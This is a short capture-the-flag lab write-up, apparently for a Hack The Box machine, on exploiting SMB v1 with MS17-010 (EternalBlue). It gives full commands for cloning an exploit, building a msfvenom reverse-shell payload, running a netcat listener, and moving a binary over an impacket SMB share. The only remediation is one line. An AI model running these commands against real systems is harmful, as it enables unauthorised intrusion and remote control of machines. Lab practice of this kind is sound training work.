
1. Recon

> 139  - netbios

> 445 - SMB
- Message Signinig disabled 
- SMB v1
- vulnerable to MS-17-010 (EternalBlue)

> 3389

2. Intial Access

- Downloaded the exploit code from repo and get the python code send_and_execute.py
```
git clone https://github.com/helviojunior/MS17-010.git
```
- created a windows revreshell using msfvenom and started listener
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > eternalblue.exe

nc -nlvp 4444
```
- got reverseshell when used with exploit python code
```
python send_and_execute.py 10.10.10.4 ~/Desktop/eternalblue.exe
```

3. Post Exploit

- Checked for whoami command but not found, not able to found revershell user
- Not found powershell and netcat also, needed to trasnfer whomi.exe windows binary
- Started SMB server and transfered file to target

```
sudo /usr/share/doc/python-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
```
- Accessed share from target machine
```
\\10.10.14.6\temp\whoami.exe
```
- Found that we are already NT Authority


4. Remediations

- Systems should be updated with security patched

References
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit